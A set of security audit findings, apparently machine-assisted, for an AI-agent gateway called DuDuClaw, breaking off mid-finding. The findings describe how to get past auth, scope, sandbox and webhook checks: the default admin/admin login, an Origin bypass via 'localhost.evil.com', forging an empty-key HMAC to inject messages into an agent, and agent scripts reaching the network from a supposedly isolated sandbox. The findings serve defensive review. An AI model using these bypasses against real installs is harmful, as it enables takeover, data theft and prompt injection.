summary: tool_requires_scope() returns None for the most dangerous tools, so any authenticated internal principal — even one issued a narrowly-scoped key — can call them.
failure_scenario: An operator issues an internal API key with scopes='memory:read' to a low-trust agent. The dispatcher's scope check (mcp_dispatch.rs:128) only rejects a tool when tool_requires_scope returns Some. Because execute_program, agent_remove, agent_update_soul, agent_update, spawn_agent, send_to_agent, evolution_toggle, schedule_task, delete_cron_task, shared_wiki_write, and shared_wiki_delete all fall through to `_ => None`, that key can invoke execute_program (arbitrary code in the PTC sandbox) and agent_update_soul (rewrite any agent's system prompt). The external whitelist (mcp_dispatch.rs:112) hides these from external clients but provides zero least-privilege enforcement for internal principals — every internal key is effectively unrestricted for the highest-impact tools.
verify_reasoning:
CONFIRMED end-to-end against source.

(1) Claim accuracy — mcp_auth.rs:364-412 `tool_requires_scope` maps only memory/wiki/messaging/identity/odoo/audit/reliability tools. execute_program, agent_remove, agent_update, agent_update_soul, spawn_agent, send_to_agent, evolution_toggle, schedule_task, delete_cron_task, shared_wiki_write, shared_wiki_delete are NOT matched and fall through to `_ => None` (line 411). The doc comment itself says "Returns None for unknown / unrestricted tools" (line 363).

(2) Dispatcher gate — mcp_dispatch.rs:128 `if let Some(required) = tool_requires_scope(tool_name)`: the scope-rejection block (130-141) executes ONLY when a Some is returned. None ⇒ no scope enforcement. The external whitelist guard at 112-114 is gated on `principal.is_external` and only contains 7 tools (mcp.rs:1110 EXTERNAL_TOOLS_WHITELIST = memory_search/store/read, wiki_read/write/search, send_message). An internal key has is_external=false (default in mcp_auth.rs:136-139), so it skips the whitelist entirely.

(3) Tools are real & reachable — mcp.rs:6489-6650 `handle_tools_call` dispatches every named tool: execute_program→handle_execute_program (6590), agent_update_soul→handle_agent_update_soul (6522), agent_remove (6521), spawn_agent (6519), shared_wiki_write/delete (6579/6581), schedule_task (6505), delete_cron_task (6508), evolution_toggle (6530). No -32601/unknown-tool path for them.

(4) No downstream guard — handle_tools_call receives only `caller_is_admin: bool` (mcp.rs:6434), which is consumed solely by audit_trail_query and reliability_summary (6532-6533). The dangerous handlers receive no principal/scope/admin. handle_execute_program(args) (mcp.rs:8825) takes only args and runs arbitrary python/bash/javascript in the PTC sandbox (8845-8873). The two other match blocks I checked (6467-6488 `is_state_changing` and 6680+ `build_params_summary`) are audit-logging only, not authz. handle_agent_update_soul performs soul-guard hash refresh but no caller authorization.

Failure scenario is constructible exactly as described: an internal key with scopes=["memory:read"] (is_external=false) calling execute_program or agent_update_soul passes the external-whitelist gate (skipped for internal), passes the scope gate (None ⇒ no check), passes rate limiting (Read op), and reaches the unguarded handler. Every internal principal is effectively unrestricted for the highest-impact tools — zero least-privilege enforcement.

Severity CRITICAL is justified: execute_program = arbitrary code execution; agent_update_soul = rewrite any agent's system prompt. Only mitigation is the PTC sandbox isolation for execute_program and whatever the default_internal_principal grant model is in practice, but neither closes the least-privilege gap for an explicitly narrowly-scoped issued key.

summary: Tool egress restore path reveals vault cleartext without ever enforcing the entry's RestoreScope, unlike the pipeline restore path.
failure_scenario: A tool whitelisted with restore_args=Restore (e.g. send_email, odoo.*) emits args containing a token whose vault entry has restore_scope=AnyScope{"FinanceRead"} or Owner. EgressEvaluator::decide -> RestoreArgsMode::Restore (lines 122-169) calls vault.lookup_mapping and substitutes entry.original whenever it is Some, and NEVER calls entry.restore_scope.allows(...). The pipeline restore() (pipeline.rs:225) does enforce scope, but the egress path does not, so any agent/sub-agent that can trigger a whitelisted tool can exfiltrate scoped/Owner PII to that tool regardless of authorization. There is also no Caller plumbed into decide() at all, so scope can't even be evaluated.
verify_reasoning:
CONFIRMED. The egress restore path leaks scoped cleartext with no RestoreScope enforcement.

Direct evidence in crates/duduclaw-redaction/src/egress.rs:
- decide() signature (lines 79-87) accepts only tool_name, args, agent_id, session_id, vault, audit. There is NO Caller parameter, so scope cannot be evaluated at all.
- RestoreArgsMode::Restore arm (lines 122-169): substitute_tokens calls vault.lookup_mapping (line 127) and on Ok(Some(entry)) matches entry.original; if Some(plain) it increments count and returns Some(plain) (lines 128-132), revealing cleartext. The ONLY guard is the hallucination/expiry check (entry.original == None at lines 133-141). entry.restore_scope is never read and entry.restore_scope.allows(...) is never called anywhere in this file.

Contrast — the pipeline restore path DOES enforce it: pipeline.rs restore() takes caller: &Caller (line 184) and at lines 225-234 does `if !entry.restore_scope.allows(caller) { emit RestoreDenied; return TokenAction::Keep; }` before revealing entry.original (line 235-244).

The scope data is present in the very entry the egress path holds: vault/store.rs:25 `pub restore_scope: RestoreScope`, populated by lookup_mapping (store.rs:204,227). RestoreScope::allows (rules/mod.rs:46-55) genuinely gates Owner / AnyScope / AllScopes — bypassing it is a real authorization bypass.

Scenario is reachable in production, not hypothetical: profiles/financial.toml lines 11/18/25 define `restore_scope = { kind = "any_scope", scope = "FinanceRead" }` for financial PII; general.toml/regex defaults are Owner. So whitelisted tokens commonly carry scopes the egress path ignores.

Live call chain confirms exploitability: mcp.rs:6301 calls layer.decide_tool_args; mcp_redaction.rs:138-140 calls manager.decide_tool_call(tool_name, args, agent_id, Some(session_id)) — passes no Caller/scope; on EgressDecision::Allow (mcp.rs:6302-6305) the restored cleartext args are injected into params and then dispatched to the tool. A tool whitelisted as Restore (send_email, odoo.*) emitting args containing a FinanceRead-scoped or Owner-scoped token gets entry.original substituted with zero authorization check, exfiltrating scoped/Owner PII to that tool.

Every concrete claim in the finding (no scope check, no Caller plumbed, asymmetry vs pipeline.rs:225) is verified against the actual source.

summary: Phone-home refresh installs a new license after checking only the signature, never calling License::validate (expiry/fingerprint/grace), unlike the bootstrap path.
failure_scenario: Control-plane (buggy, compromised, or via a replayed signed `{"status":"active","license":...}` response) returns a validly-signed License whose machine_fingerprint belongs to a DIFFERENT machine or whose expires_at is in the past. `do_phone_home_once` (lines 430-449) verifies `registry.verify(&new_license)` but then immediately `save_default(&new_license)` + swaps it into `inner.license` with no `new_license.validate(&current_fp, ...)`. Result: a machine that should be OpenSource gets a foreign/expired commercial license persisted to disk and activated, defeating per-machine binding and expiry. The bootstrap path (`load_and_validate`, lines 320-344) does call `validate`, so the refresh path is strictly weaker than initial load.
verify_reasoning:
CONFIRMED against source.

The refresh path `do_phone_home_once` (license_runtime.rs:430-449) on `status=="active"` deserializes the new license (435-436), calls only `self.registry.verify(&new_license)` (438), then `save_default(&new_license)` (444) and swaps it into `inner.license` (447-448). It never calls `new_license.validate(...)`.

`registry.verify` is signature-only: key.rs:82-87 → `verify_license` (key.rs:23-43) verifies an Ed25519 signature over `canonical_payload` and nothing else. The License docstring confirms the split: license.rs:108-111 says `validate` "Does not verify the cryptographic signature."

`License::validate` (license.rs:115-147) is what enforces the missing checks: Expired (129-131), InvalidFingerprint via `is_valid_for_machine` exact-string compare (133-135, 104-106), GracePeriodExceeded (137-141), plus schema/NotYetValid.

The bootstrap path `load_and_validate` (license_runtime.rs:311-344) calls BOTH `registry.verify` (311) AND `license.validate(&current_fp, phone_home, grace)` (320), explicitly handling Expired/InvalidFingerprint/GracePeriodExceeded. So the refresh path is strictly weaker than initial load — exactly as claimed.

Failure scenario is reachable: a validly-signed License whose machine_fingerprint belongs to a different machine, or whose expires_at is past, is persisted to disk and activated. The request body (400-405) carries no nonce/freshness, so a replayed signed `{"status":"active","license":...}` response also works (a buggy/compromised control-plane trivially does). The CRL loop does not save it — it only checks subscription revocation (line 538), not fingerprint/expiry — so it won't catch this. The foreign/expired license stays active until the next gateway restart re-runs load_and_validate. CRITICAL severity for license per-machine binding + expiry bypass is justified.

summary: ensure_default_admin ships a hardcoded, trivially guessable default admin password "admin" despite the doc comment promising a random 24-char password.
failure_scenario: On first boot of any fresh DuDuClaw install the users table is empty, so ensure_default_admin creates admin@local with password literally "admin" (line 532) and logs it via warn!. handle_login (server.rs:1128) accepts these credentials and issues a full admin-role JWT (UserRole::Admin bypasses all ACL checks via UserContext.is_admin). There is no forced password change. Any attacker who can reach the dashboard /api/login endpoint logs in as admin@local / admin and gains full control of every agent, SOUL.md, skills, and user management. The doc comment lines 520-523 ("random 24-char password") is contradicted by the code, so operators are misled into believing the install is safe.
verify_reasoning: All links verified against real source. crates/duduclaw-auth/src/db.rs:532 hardcodes `let default_password = "admin";` despite the doc comment at db.rs:521 promising a "random 24-char password" — the warn! banner at db.rs:550-554 even logs `Password: admin`. ensure_default_admin (db.rs:524) runs when the users table is empty (`if count == 0`, db.rs:531) and inserts `admin@local` with role `"admin"` (db.rs:537-540). It is called unconditionally on gateway boot at crates/duduclaw-gateway/src/server.rs:358. handle_login (server.rs:1115) calls verify_password (server.rs:1128) and, on success, immediately issues a full access token carrying the user's role + agent bindings (server.rs:1147) with NO forced-password-change gate. A repo-wide grep for must_change_password/force-password/first_login found no blocking mechanism — only non-blocking CLI advisory prints (crates/duduclaw-cli/src/lib.rs:2464,2516). UserRole::Admin makes is_admin() true (crates/duduclaw-auth/src/acl.rs:61-63), which short-circuits can_access_agent (acl.rs:67-71), has_agent_access (acl.rs:76-83), and visible_agents→"all" (acl.rs:88-91), so the JWT bypasses all ACL checks. Login rate limiting (server.rs:1120) is irrelevant since the attacker already knows admin@local/admin. The failure scenario is fully constructible: fresh install → attacker reaches /api/login → logs in as admin@local/admin → full admin control.

summary: DockerRuntime::create silently ignores network_access, tmpfs and memory limits from ContainerConfig, so the PTC sandbox's requested --network=none isolation is never applied.
failure_scenario: duduclaw-cli/src/ptc/sandbox.rs:358 builds ContainerConfig{network_access:false} expecting --network=none, but DockerRuntime's HostConfig (docker.rs:64-76) only sets binds + readonly_rootfs and leaves network_mode/tmpfs/memory at Default (None). An agent-authored Python/bash script run via execute_in_container therefore runs on Docker's default bridge network with full outbound connectivity, enabling SSRF to cloud metadata endpoints / internal services and data exfiltration despite the code/comments claiming network is disabled.
verify_reasoning:
The core security claim is fully provable from the source.

PATH: duduclaw-cli/src/ptc/sandbox.rs:295 `execute_in_container` obtains a runtime via `RuntimeBackend::detect()` (sandbox.rs:303) and calls `runtime.create(container_config)` (sandbox.rs:368) with `network_access: false  // --network=none` (sandbox.rs:358). `RuntimeBackend::create` (lib.rs:46-52) dispatches to the concrete backend; on a Docker host this is `DockerRuntime::create`.

VULNERABLE CODE: docker.rs:64-76 builds the `HostConfig` reading ONLY `binds` (line 65) and `readonly_rootfs` (line 70), then `..Default::default()` (line 75). It never references `config.network_access`. bollard's `HostConfig::network_mode` is `Option<String>` and is therefore left `None`, so Docker attaches the container to its default bridge network with full outbound connectivity — the requested `--network=none` is silently dropped. `config.network_access` is in fact dead/unread on this path (only `timeout_ms`, `readonly_project`, and `additional_mounts` are consumed). The `info!(... network = "none" ...)` log at sandbox.rs:380 is cosmetic and false. This enables SSRF to cloud metadata endpoints / internal services and outbound exfiltration from agent-authored scripts, exactly as described.

The Apple backend is even worse: apple.rs:74 `create(&self, _config: ...)` ignores the config entirely and `start` (apple.rs:82) is a no-op, so no isolation flags are applied there either.

Note that a CORRECT implementation exists but is NOT on this path: duduclaw-container/src/sandbox.rs (`run_sandboxed_with_env`, lines 133-149) properly sets `network_mode`, `tmpfs`, and `memory: 512MB`. PTC does not use that function, so its existence does not mitigate the finding.

Minor inaccuracy in the finding's wording (does not affect the verdict): `ContainerConfig` (core/src/types.rs:247-272) has `network_access` but has NO `tmpfs` or `memory` fields, so those two aren't 'ignored from ContainerConfig' — they don't exist to pass. The CRITICAL network-isolation claim stands as written.

summary: WebChat client opens /ws/chat with no authentication token or handshake, and the backend ws_chat_handler enforces no auth either — the agent chat channel is fully unauthenticated.
failure_scenario: chat-store.connect() does `new WebSocket('/ws/chat')` then sets state to 'connected' on onopen and immediately allows send() of user_message frames with no JWT/token (contrast with ws-client.ts which performs a `connect` handshake carrying {jwt}). The backend handler (crates/duduclaw-gateway/src/webchat.rs:102 ws_chat_handler -> handle_chat_socket) only does IP rate-limiting; it never validates a JWT or the legacy auth token. With the gateway bound to 0.0.0.0 (the documented example in server.rs:64), any unauthenticated network client can open /ws/chat and converse with the main agent — consuming LLM budget, exfiltrating agent/company knowledge, and triggering MCP tool calls — completely bypassing the LoginPage/JWT/RoleGuard auth that protects every other dashboard surface.
verify_reasoning:
All claims verified against source.

CLIENT (web/src/stores/chat-store.ts): connect() builds the URL at line 60 `const url = \`${protocol}//${window.location.host}/ws/chat\`;` then line 61 `new WebSocket(url)` — NO token, NO query param, NO handshake. onopen (line 64-67) immediately sets connectionState 'connected'. send() (line 182-206) transmits `{type:'user_message', content, session_id}` with no auth field. Contrast confirmed: web/src/lib/ws-client.ts line 117-119 sends `{ jwt: token }` via a `connect` handshake call — chat-store does no such thing.

BACKEND (crates/duduclaw-gateway/src/webchat.rs): ws_chat_handler (line 102-108) takes only `WebSocketUpgrade`, `ConnectInfo<SocketAddr>`, `State<Arc<WebChatState>>` — no HeaderMap, no JWT extraction, no Authorization read. It calls ws.on_upgrade unconditionally. handle_chat_socket (line 117-283) only does: a global semaphore try_acquire (line 118), per-IP connection count via acquire_connection (line 133), and a heartbeat. There is NO JWT verification and NO legacy auth-token check anywhere in the handler. On a UserMessage it directly calls chat_commands::handle_command (line 216) and channel_reply::build_reply_with_session (line 231) — i.e. drives the main agent's LLM/MCP path, consuming budget. WebChatState (line 62-66) holds only `ctx` + connection map — it has no AuthManager and no JwtConfig, so auth is structurally impossible in this handler.

ROUTING (crates/duduclaw-gateway/src/server.rs): line 971-975 the webchat_router is built with `.with_state(webchat_state)` and the explicit comment "WebChat endpoint — separate state from main /ws (different auth model)", then merged at line 996 `.merge(webchat_router)`. No `.layer(...)` auth middleware wraps it (verified lines 1027-1066 have no auth layer). The auth-bearing AppState (with `auth: AuthManager` and `jwt_config`) at line 962-969 is NOT used by /ws/chat. The main /ws handler (ws_handler, line 1376+) by contrast validates Origin and rate-limits at upgrade before the connect/{jwt} handshake — /ws/chat does neither (not even an Origin check).

EXPOSURE: server.rs line 64 documents bind example `"0.0.0.0"`; line 1048 `format!("{}:{}", config.bind, config.port)`. So with the documented bind any unauthenticated network client can open /ws/chat and converse with the main agent, bypassing LoginPage/JWT/RoleGuard (App.tsx RoleGuard, AuthGuard.tsx) that gate every other dashboard surface. Failure is fully constructible from the cited lines. CRITICAL severity stands.

summary: WebSocket Origin allowlist uses starts_with, so attacker-controlled hostnames like http://localhost.evil.com pass the cross-site hijack guard.
failure_scenario: An attacker registers localhost.evil.com (or 127.0.0.1.evil.com) and serves a page that opens a WebSocket to ws://127.0.0.1:<port>/ws. The browser sends Origin: http://localhost.evil.com, which satisfies origin.starts_with("http://localhost"), so the FORBIDDEN branch is skipped. On a typical local-only install (no users in users.db, no auth_token), handle_socket falls through to UserContext::admin_fallback() at server.rs:1569, giving the malicious page full admin RPC (agents.create/remove, channels.add, accounts.add, system.update_config). The check must compare against exact host:port (parse the URL authority) rather than a string prefix.
verify_reasoning:
The Origin guard at crates/duduclaw-gateway/src/server.rs:1391-1394 uses prefix matching with no host boundary:
  let is_safe = origin.starts_with("http://127.0.0.1") || origin.starts_with("http://localhost") || origin.starts_with("https://127.0.0.1") || origin.starts_with("https://localhost");
I compiled the exact expression: "http://localhost.evil.com" => is_safe=true, "http://127.0.0.1.evil.com" => is_safe=true, "https://localhost.attacker.io/ws" => is_safe=true. So the FORBIDDEN branch (server.rs:1397) is skipped for attacker-controlled hostnames — the lost-boundary bug is real (no trailing ':'/'/'/end-of-string check).

Full reachable attack chain, all verified in source:
- server.rs:1416 — `if state.auth.is_auth_required() || has_users(&state.user_db)`. is_auth_required (auth.rs:45) = `self.token.is_some() || self.ed25519_pubkey.is_some()` — false when no token/pubkey configured. has_users (server.rs:1704) = list_users non-empty — false on a fresh local install with empty users.db. Both false ⇒ else branch.
- server.rs:1569 — else branch returns `UserContext::admin_fallback()`.
- acl.rs:26-32 — admin_fallback() sets `role: UserRole::Admin` and is documented to "bypass all ACL checks" (local-only mode).
- server.rs:1627 — RPC dispatched with this user_ctx: `state.handler.handle(&method, params, &user_ctx)`.
- handlers.rs:347 — `require_admin!` => `acl::require_role(ctx, UserRole::Admin)`; passes for the Admin fallback. Gated methods at handlers.rs:384 (agents.create), :396 (agents.remove), :404 (channels.add), :425 (accounts.add), :482 (system.update_config) all become reachable.

Default bind is "0.0.0.0" (server.rs:64-65, 1048). The no-auth admin fallback is the documented default for a local-only dashboard, matching the finding's "typical local-only install" precondition. The only non-code factor is whether the victim browser delivers the WebSocket to the loopback/LAN target (DNS-rebinding-style or LAN access), an environmental concern outside this file — but the code-level cross-site-origin guard bypass and resulting unauthenticated admin RPC access are provable from the lines above. The finding's prescribed fix (parse the URL authority and compare exact host:port instead of a prefix) is correct.

summary: wiki.* / tasks.* / activity.list / shared_wiki.* / skills.content dispatch with no role or agent-binding check, so any authenticated low-privilege user reads/mutates data for agents they are not bound to.
failure_scenario: An Employee-role user whose JWT only binds agent A connects and sends {method:"wiki.read", params:{agent_id:"agent-B", page_path:"sops/secrets.md"}}. dispatch() routes wiki.read with no check_agent!/require_role (unlike memory.* at handlers.rs:429-440 which enforce check_agent!(Viewer)). handle_wiki_read only validates is_valid_agent_id and reads $HOME/agents/agent-B/wiki/... returning another team's private SOP content. Same gap lets the user tasks.create/tasks.remove/tasks.assign against arbitrary agents (handlers.rs:6971-7136) and even trigger Autopilot delegate/run_skill side effects via emit_autopilot_event. Add check_agent!(Viewer)/require_role to these arms to match the memory.* scoping.
verify_reasoning:
The finding is confirmed against the real source.

ATTACK PATH IS REACHABLE WITH A REAL LOW-PRIVILEGE PRINCIPAL: server.rs:1416-1570 builds the per-connection UserContext. When a user DB exists, a JWT connect goes through authenticate_jwt -> UserContext::from_claims (server.rs:1431,1688-1699), which preserves the real role (acl.rs:36-53) and the per-agent agent_access map. UserRole::Employee is the lowest role (models.rs:6-25, level 1). That exact user_ctx is passed to state.handler.handle(&method, params, &user_ctx) at server.rs:1627, which calls dispatch() (handlers.rs:332-338). So a non-admin Employee context genuinely reaches the dispatch table — this is not coerced to admin_fallback (that only happens for Ed25519/legacy-token/no-auth modes, server.rs:1490,1526,1569).

MISSING CHECK CONFIRMED: In dispatch() the memory.* arms enforce scoping — handlers.rs:429-440 each call check_agent!(AccessLevel::Viewer) (the macro at 362-368 -> acl::extract_and_check_agent -> require_agent_access, acl.rs:109-136). By contrast the wiki.* arms have NO guard: handlers.rs:443-447 (`"wiki.read" => self.handle_wiki_read(params).await`) — note ctx is not even forwarded. handle_wiki_read (handlers.rs:2571-2589) reads agent_id straight from params, validates only is_valid_agent_id format, then reads self.home_dir.join("agents").join(agent_id).join("wiki") via WikiStore::read_raw with no ownership/role check. So an Employee bound only to agent A can send {method:"wiki.read", params:{agent_id:"agent-B", page_path:"..."}} and receive agent B's private wiki content (response returns {content,...}). handle_wiki_pages (2540-2568) and handle_wiki_search (2591-2641) have the identical pattern.

MUTATION + SIDE EFFECTS CONFIRMED: tasks.* arms at handlers.rs:568-572 have no guard (comment at 567 literally says "open to all authenticated"). handle_tasks_create (6971-7033) inserts an arbitrary task with attacker-chosen assigned_to and then calls self.emit_autopilot_event(AutopilotEvent::TaskCreated) at 7027-7030; handle_tasks_update (7035-7107) emits TaskUpdated/TaskStatusChanged; handle_tasks_assign (7128-7136) reassigns to any agent_id; handle_tasks_remove (7109-7126) deletes any task_id. None take or check ctx. activity.list (575) -> handle_activity_list (7140+) likewise filters only by an optional client-supplied agent_id with no binding check. skills.content (464) -> handle_skills_content (3108) is also unguarded.

So an Employee can read another team's per-agent wiki, mutate/delete arbitrary tasks, and inject Autopilot TaskCreated/TaskStatusChanged events that the rule engine can turn into delegate/run_skill side effects — exactly as claimed. The fix (add check_agent!(Viewer)/require_role to mirror memory.*) is appropriate.

MINOR INACCURACY (does not change the verdict): shared_wiki.* (handlers.rs:456-459) is by design a cross-agent shared knowledge base, not per-agent data, so listing it as "another team's private SOP" is imprecise — though shared_wiki.read is still unauthenticated-by-role and write/delete enforcement lives elsewhere (RFC-21 .scope.toml policy). The load-bearing claims (per-agent wiki.* cross-tenant read, tasks.* mutation, autopilot side effects, all missing the check_agent! that memory.* uses) are all factually correct.

summary: Telegram Markdown parse-error retry keeps parse_mode=Markdown, so it can never recover and the user receives nothing.
failure_scenario: AI reply contains unbalanced Markdown (e.g. a lone '*' or '_', or '[' from code/JSON). Telegram returns HTTP 400 'Bad Request: can't parse entities'. The condition at line 1040 matches on 'Bad Request' and retries, but the fallback SendMessage at line 1045-1052 still sets parse_mode: Some("Markdown"), so the retry fails identically and the reply is silently dropped. The dispatcher.rs path (line 2364) correctly drops parse_mode on retry, proving the intended fix; the live channel-reply path diverges.
verify_reasoning:
The finding is accurate. In crates/duduclaw-gateway/src/telegram.rs::send_reply, the initial send at line 1023 sets parse_mode: Some("Markdown"). When Telegram rejects the message, the retry condition at lines 1040-1042 matches any error containing "Bad Request" (desc.contains("Bad Request")) — which is exactly the prefix Telegram uses for "Bad Request: can't parse entities" Markdown errors. But the fallback SendMessage at lines 1045-1052 re-sets parse_mode: Some("Markdown".to_string()) (line 1048), changing ONLY reply_parameters to None. Since unbalanced Markdown (lone '*', '_', '[' from code/JSON) is a property of the text, not of reply_parameters, the retry sends identical parse_mode and fails identically; the second failure is only logged (line 1058: error!("Telegram retry also failed: ...")) and nothing else is sent, so the user receives nothing.

This is provable end-to-end: the SendMessage struct (lines 144-155) marks parse_mode with #[serde(skip_serializing_if = "Option::is_none")], so setting it to None would omit the field and make Telegram default to plain text. The correct fix is demonstrated in dispatcher.rs lines 2363-2367, whose fallback_payload omits parse_mode entirely ("Retry without parse_mode in case Markdown causes issues on this chunk"), recovering the message. The live channel-reply path (send_reply) diverges from this intended behavior, exactly as the finding states. There is no other guard, alternate fallback, or plain-text retry on this path — confirmed by reading the full function (lines 1001-1069).

summary: to_discord_message can produce embeds whose total length exceeds Discord's 6000-char per-message limit (and silently drops content past 10 embeds), causing the whole reply to be rejected or truncated.
failure_scenario: An AI reply of ~6000-40000 chars is split into multiple 4096-char embeds via split_text. send_discord_message (discord.rs:1584) only splits on payload["content"], never on embeds, and there is no check against Discord's 6000-char aggregate embed limit. Discord returns HTTP 400 and the entire reply is lost. For replies >~40960 chars, `&embeds[..embeds.len().min(10)]` also silently discards everything beyond the 10th embed with no warning.
verify_reasoning:
CONFIRMED on the real source.

(1) Aggregate 6000-char overflow: channel_format.rs:79 splits the reply via `split_text(text, limits::DISCORD_EMBED_DESC)` where DISCORD_EMBED_DESC=4096 (line 11). For a reply of ~5000-8192 chars this yields 2 embeds whose combined description length (e.g. 4096 + ~3000 = ~7096) exceeds Discord's 6000-char per-message aggregate embed limit. There is NO check against 6000 anywhere — confirmed by grep (only the per-embed 4096 split and the 10-embed cap exist). The resulting JSON `{ "embeds": [...] }` (line 93) is sent as one message: discord.rs:1408 passes the unmodified `reply` to to_discord_message, then discord.rs:1450 calls send_discord_message. send_discord_message (discord.rs:1584-1598) ONLY inspects `payload["content"]` (line 1586) and splits plain text; it never touches `payload["embeds"]` and never splits across multiple messages for embeds. send_raw posts the whole payload in a single HTTP request, so Discord returns HTTP 400 and the entire reply is lost. The 400 branch at discord.rs:1618 only special-cases REPLIES_CANNOT_REFERENCE_OTHER_CHANNEL (line 1627); a "too many characters"/embed-size 400 falls through to the generic error at 1666-1671 — no recovery, reply dropped. The misleading comment at discord.rs:1449 ("Split if needed (embed description > 4096 or plain text > 2000)") confirms the author believed embeds were split, but they are not.

(2) Silent drop past 10 embeds: line 93 `&embeds[..embeds.len().min(10)]` truncates the slice to the first 10 embeds with no warning/log. For a reply > 10*4096 = 40960 chars, split_text produces 11+ chunks and everything beyond the 10th embed is silently discarded. Also note the footer is attached only to the last chunk (line 86, `i == chunks.len() - 1`), so when truncated to 10 the footer-bearing final embed is among those dropped.

Both failure modes are directly reachable: AI replies of several thousand chars are normal (the embed path itself triggers for text.len() >= 200 per line 74), and there is no upstream truncation of `reply` before to_discord_message (discord.rs:1408). Severity HIGH / correctness is accurate.

summary: LINE webhook signature verification fails open when the channel secret is unconfigured (empty key), letting anyone forge valid signatures and inject arbitrary user messages into the agent.
failure_scenario: read_line_config() returns the secret via unwrap_or_default(), so if line_channel_secret is absent/blank the bot still starts with secret="". verify_signature() then calls HmacSha256::new_from_slice(b"") (which succeeds for any key length) and compares against the attacker-supplied X-Line-Signature. An attacker who knows/guesses the secret is empty computes base64(HMAC-SHA256(key="", body)) and POSTs a crafted events[] body to /webhook/line; it passes verification and is fed straight into build_reply_with_session() as a trusted user message — full prompt injection / unauthorized agent invocation. Unlike whatsapp.rs/feishu.rs (which explicitly skip verification only when the operator left the secret blank, a documented fail-open), LINE pretends to verify with an empty key, so an operator who set the token but forgot the secret has zero protection while believing signatures are checked.
verify_reasoning:
CONFIRMED. The empty-secret fail-open is fully constructible from the source.

Reachable empty-secret state: read_line_config (line.rs:520-522) reads the secret via `.unwrap_or_default()`, so an absent/blank `line_channel_secret` yields `secret=""`. start_line_bot (line.rs:133-135) only guards `if token.is_empty() { return None }` — there is NO `secret.is_empty()` check, so the bot starts and registers /webhook/line with `secret=""`. The config-save path corroborates that this state is operator-reachable: handlers.rs:1930-1938 silently writes nothing for a blank secret (`if !secret.is_empty() { Some(...) } else { None }`) with no error, so an operator can save a LINE token while leaving the secret blank.

The bypass itself: verify_signature (line.rs:387-398) calls `HmacSha256::new_from_slice(secret.as_bytes())` — for HMAC (hmac 0.12) `new_from_slice` accepts a key of ANY length including empty, so with `secret=""` it returns `Ok`, NOT the `Err(_) => return false` arm. It then computes `expected = base64(HMAC-SHA256(key=b"", body))` and `constant_time_eq(expected, attacker_signature)`. Since the key is the empty string and the body is attacker-supplied, the attacker can compute the exact matching signature `base64(HMAC-SHA256(key="", body))` and send it in X-Line-Signature; verification passes.

Trusted-input flow: on pass, the handler (line.rs:201 -> 356) parses the attacker body and feeds `input_text` straight into `build_reply_with_session(...)` as a trusted user message — unauthorized agent invocation / prompt injection.

Contrast in the finding is accurate: whatsapp.rs:199-208 explicitly guards `if !state.app_secret.is_empty()` before verifying (documented fail-open when blank), and feishu.rs:120 rejects startup entirely when `app_secret.is_empty()`. LINE does neither — it always invokes verify_signature and "pretends to verify" with an empty key, giving an operator who set the token but omitted the secret zero protection while believing signatures are checked. The constant_time_eq comparison does not mitigate this; it only prevents timing leaks, not a known-empty-key forgery.

summary: Request coalescing merges bus messages purely by agent_id, with no check that origin_agent/session_id/turn_id match, then broadcasts the single combined response to every coalesced sender's callback.
failure_scenario: User A (session sA) and User B (session sB) both send_to_agent the same worker within one 5s poll cycle. coalesce_messages groups them by agent_id and builds one prompt '[Message 1] A's secret request --- [Message 2] B's request'. dispatch produces one response addressing both. poll_and_dispatch (lines 706-709) then calls forward_delegation_response with the SAME response_for_callback for first.message_id AND every coalesced_ids entry, so User B receives a reply containing content generated for User A's request (and vice versa) — a cross-conversation data leak. The coalesced BusMessage also inherits only first.session_id/turn_id, mis-attributing trust-feedback and parent-session appends for the other senders.
verify_reasoning:
The described coalescing mechanism is real and literally as claimed. coalesce_messages (dispatcher.rs:1315-1393) groups BusMessages purely by agent_id (lines 1322-1329) with NO origin_agent/session_id/turn_id equality check; it joins payloads as "[Message N] ...", takes coalesced_ids = chunk.iter().skip(1).message_id (line 1372), and inherits ONLY first.session_id/turn_id/origin_agent (lines 1383-1387). Then poll_and_dispatch (lines 706-709) forwards the SAME response_for_callback to msg.message_id AND every extra_id in msg.coalesced_ids. If two channel-bound senders' messages were ever coalesced, forward_delegation_response (lines 1779-1862) would resolve each extra_id to ITS OWN channel_id/thread_id callback row but deliver the combined response_text — exactly the cross-conversation leak described, plus session/turn mis-attribution.

However, the finding is NOT presently CONFIRMED because the specific trigger ("User A and User B both send_to_agent the same worker") is blocked by an invariant elsewhere: coalesce_messages runs ONLY on the legacy JSONL rail (poll_and_dispatch, the sole call site at dispatcher.rs:479). Per the v1.8.18 fix, send_to_agent no longer writes to bus_queue.jsonl — it inserts only into SQLite message_queue (crates/duduclaw-cli/src/mcp.rs:1758-1789) and registers the delegation_callbacks row there (mcp.rs:1851-1856). The SQLite rail (poll_and_dispatch_sqlite, dispatcher.rs:169-255) processes each message individually and never calls coalesce_messages, forwarding each message's own response to its own callback (line 223). The only remaining JSONL agent_message writers — spawn_agent (mcp.rs:3282-3295), dashboard handle_agents_delegate (handlers.rs:933-942), and webhook (webhook.rs:170-179) — register NO delegation_callbacks, so any coalesced forward hits the harmless no-callback branch (dispatcher.rs:1816-1831). register_callback (message_queue.rs:403) has no production callers.

So the leak code is live but currently unreachable by the stated path. It is a latent landmine rather than a present vulnerability: the no-session-check coalescing plus the unconditional fan-out at lines 707-709, combined with the retry path that re-inserts callbacks (dispatcher.rs:1916) and the historical fact that callbacks once flowed through the JSONL rail, means a single regression (re-enabling JSONL-rail send_to_agent callbacks, or routing coalescing onto the SQLite rail) would immediately produce the cross-conversation data leak. Defaulting to PLAUSIBLE per the rubric: realistic reachable state (one config/regression away), mechanism provably correct, current trigger blocked but not by any guard inside the coalescing code itself.

summary: Worktree snap merges agent commits into the main branch when only worktree_cleanup_on_exit is enabled, even though worktree_auto_merge is false.
failure_scenario: An agent is configured with container.worktree_cleanup_on_exit = true and container.worktree_auto_merge = false (operator wants throwaway worktrees, never auto-merge). dispatch_in_worktree enters the snap block because cfg.auto_merge || cfg.cleanup is true, calls determine_snap_action (worktree.rs:180) which has no notion of the auto_merge flag and returns MergeAndCleanup whenever the worktree has new commits and no conflict. execute_snap then runs atomic_merge, pushing the sub-agent's commits onto main/master without the operator's consent — the exact outcome they disabled auto_merge to prevent.
verify_reasoning:
CONFIRMED. The failure is fully constructible from the code.

Config mapping (dispatcher.rs:781-782): cfg.auto_merge = container.worktree_auto_merge, cfg.cleanup = container.worktree_cleanup_on_exit.

With worktree_auto_merge=false and worktree_cleanup_on_exit=true:

